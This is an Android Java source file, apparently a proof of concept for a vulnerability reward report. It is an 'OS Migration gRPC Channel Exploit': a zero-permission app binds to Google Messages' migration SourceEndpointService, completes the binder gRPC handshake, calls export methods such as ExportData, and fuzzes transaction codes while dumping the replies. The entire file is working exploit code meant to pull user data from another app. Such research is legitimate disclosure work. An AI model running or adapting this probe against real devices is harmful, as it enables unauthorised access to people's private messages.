package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

public class MigrationProbeActivity extends Activity {
    private static final String T = "MIGPROBE";

    private static final String[][] TARGETS = {
        {"com.google.android.apps.messaging", ".backup.service.osmigration.SourceEndpointService",
         "Messages SOURCE"},
    };

    private int targetIndex = 0;
    private volatile IBinder serverEndpoint = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== OS Migration gRPC Channel Exploit ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());
        Log.w(T, "ZERO PERMISSIONS");
        tryNextTarget();
    }

    private void tryNextTarget() {
        if (targetIndex >= TARGETS.length) {
            Log.w(T, "=== COMPLETE ===");
            return;
        }
        String pkg = TARGETS[targetIndex][0];
        String cls = TARGETS[targetIndex][1];
        String label = TARGETS[targetIndex][2];

        Log.w(T, "--- " + label + " ---");
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(pkg, pkg + cls));
        try {
            bindService(intent, new ServiceConnection() {
                public void onServiceConnected(ComponentName name, IBinder service) {
                    Log.w(T, "*** BOUND: " + label + " ***");
                    final String lbl = label;
                    new Thread(new Runnable() { public void run() { exploitService(service, lbl); } }).start();
                }
                public void onServiceDisconnected(ComponentName name) {}
            }, Context.BIND_AUTO_CREATE);
        } catch (Exception e) {
            Log.e(T, "Bind error: " + e.getMessage());
        }
    }

    private void exploitService(IBinder service, String label) {
        serverEndpoint = null;

        IBinder clientEndpoint = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                Log.w(T, "[CB] code=" + code + " flags=" + flags + " size=" + data.dataSize());

                if (code == 1) {
                    // SETUP_TRANSPORT response: version + server endpoint binder
                    data.setDataPosition(0);
                    try {
                        int version = data.readInt();
                        Log.w(T, "[CB] Setup response version=" + version);
                        IBinder sb = data.readStrongBinder();
                        if (sb != null) {
                            Log.w(T, "[CB] *** GOT SERVER ENDPOINT BINDER ***");
                            Log.w(T, "[CB] alive=" + sb.isBinderAlive());
                            serverEndpoint = sb;
                        }
                    } catch (Exception e) {
                        Log.w(T, "[CB] Parse error: " + e.getMessage());
                        // Try reading binder at different offsets
                        for (int off = 0; off <= 16; off += 4) {
                            try {
                                data.setDataPosition(off);
                                IBinder b = data.readStrongBinder();
                                if (b != null) {
                                    Log.w(T, "[CB] Found binder at offset " + off);
                                    serverEndpoint = b;
                                    break;
                                }
                            } catch (Exception e2) {}
                        }
                    }

                    // Also dump raw data
                    data.setDataPosition(0);
                    byte[] raw = data.marshall();
                    StringBuilder hex = new StringBuilder();
                    for (int i = 0; i < Math.min(raw.length, 64); i++) {
                        hex.append(String.format("%02x", raw[i]));
                        if ((i + 1) % 4 == 0) hex.append(" ");
                    }
                    Log.w(T, "[CB] RAW: " + hex.toString());
                } else if (code == 2) {
                    Log.w(T, "[CB] ACK_BYTES");
                } else {
                    // Log any other callbacks — these might contain data
                    data.setDataPosition(0);
                    byte[] raw = data.marshall();
                    StringBuilder hex = new StringBuilder();
                    for (int i = 0; i < Math.min(raw.length, 256); i++) {
                        hex.append(String.format("%02x", raw[i]));
                        if ((i + 1) % 4 == 0) hex.append(" ");
                    }
                    Log.w(T, "[CB] code=" + code + " RAW(" + raw.length + "): " + hex.toString());

                    // Try reading strings
                    data.setDataPosition(0);
                    while (data.dataAvail() > 4) {
                        int pos = data.dataPosition();
                        try {
                            String s = data.readString();
                            if (s != null && s.length() > 0 && s.length() < 1000) {
                                Log.w(T, "[CB] STR@" + pos + ": " + s);
                            }
                        } catch (Exception e) {
                            data.setDataPosition(pos + 4);
                        }
                    }
                }
                return true;
            }
        };

        // Send SETUP_TRANSPORT (TX 1, FLAG_ONEWAY)
        try {
            Parcel data = Parcel.obtain();
            data.writeInt(1); // version
            data.writeStrongBinder(clientEndpoint);
            service.transact(1, data, null, IBinder.FLAG_ONEWAY);
            data.recycle();
            Log.w(T, "Setup sent, waiting for server endpoint...");
        } catch (Exception e) {
            Log.w(T, "Setup error: " + e.getMessage());
            return;
        }

        // Wait for server endpoint binder via callback
        for (int i = 0; i < 30 && serverEndpoint == null; i++) {
            try { Thread.sleep(100); } catch (Exception e) {}
        }

        if (serverEndpoint == null) {
            Log.w(T, "No server endpoint received after 3s");
            // The server might have sent it directly — try probing the service binder
            probeServiceDirect(service, label);
            return;
        }

        Log.w(T, "*** SERVER ENDPOINT OBTAINED ***");

        // Now we have the gRPC server endpoint. Send gRPC method calls.
        // gRPC binder transport v2: transactions on server endpoint carry gRPC frames
        // Stream creation: TX code = FIRST_CALL_TRANSACTION + streamId
        // The parcel contains serialized gRPC frames

        // Try creating streams with different method paths
        String[] methods = {
            "/com.google.osmigration.systemappapi.SourceService/ExportData",
            "/com.google.osmigration.systemappapi.SourceService/GetDataForTypes",
            "/com.google.osmigration.systemappapi.SourceService/StartExport",
            "/com.google.osmigration.systemappapi.SourceService/ListDataTypes",
            "/com.google.osmigration.systemappapi.SourceService/GetMetadata",
        };

        for (String method : methods) {
            tryGrpcStream(serverEndpoint, method);
            try { Thread.sleep(500); } catch (Exception e) {}
        }

        // Probe raw TX codes on server endpoint
        for (int txCode = 1; txCode <= 20; txCode++) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                boolean res = serverEndpoint.transact(txCode, d, r, 0);
                if (r.dataSize() > 0) {
                    Log.w(T, "SE TX" + txCode + ": res=" + res + " size=" + r.dataSize());
                    r.setDataPosition(0);
                    byte[] rb = r.marshall();
                    StringBuilder hex = new StringBuilder();
                    for (int i = 0; i < Math.min(rb.length, 64); i++) {
                        hex.append(String.format("%02x", rb[i]));
                        if ((i + 1) % 4 == 0) hex.append(" ");
                    }
                    Log.w(T, "  HEX: " + hex.toString());
                }
                d.recycle();
                r.recycle();
            } catch (Exception e) {
                if (e.getMessage() != null && !e.getMessage().contains("not found")) {
                    Log.w(T, "SE TX" + txCode + ": " + e.getMessage());
                }
            }
        }

        // Wait for any async responses
        try { Thread.sleep(3000); } catch (Exception e) {}
        Log.w(T, "--- " + label + " probing complete ---");
    }

    private void tryGrpcStream(IBinder endpoint, String method) {
        Log.w(T, "  gRPC call: " + method);
        try {
            // gRPC binder transport stream creation
            // Based on BinderTransport: streamId starts at some value
            // The parcel format for creating a new stream:
            // - int: number of transactions in batch
            // - for each: int txType, byte[] data

            Parcel data = Parcel.obtain();

            // Try writing a gRPC new-stream transaction
            // Format: count(1) + type(NEW_STREAM=0) + method path + empty headers + empty data
            data.writeInt(1); // count
            data.writeInt(0); // type = new stream
            data.writeString(method); // method path
            data.writeInt(0); // no metadata entries
            data.writeInt(0); // no data

            endpoint.transact(1, data, null, IBinder.FLAG_ONEWAY);
            data.recycle();
        } catch (Exception e) {
            Log.w(T, "  Error: " + e.getMessage());
        }
    }

    private void probeServiceDirect(IBinder service, String label) {
        Log.w(T, "  Direct probing service binder...");
        for (int txCode = 1; txCode <= 15; txCode++) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                d.writeInt(1);
                d.writeString("test");
                boolean res = service.transact(txCode, d, r, 0);
                if (r.dataSize() > 0) {
                    r.setDataPosition(0);
                    byte[] rb = r.marshall();
                    if (rb.length > 4) {
                        StringBuilder hex = new StringBuilder();
                        for (int i = 0; i < Math.min(rb.length, 64); i++) {
                            hex.append(String.format("%02x", rb[i]));
                            if ((i + 1) % 4 == 0) hex.append(" ");
                        }
                        Log.w(T, "  TX" + txCode + ": size=" + rb.length + " HEX=" + hex.toString());
                    }
                }
                d.recycle();
                r.recycle();
            } catch (Exception e) {}
        }
    }
}
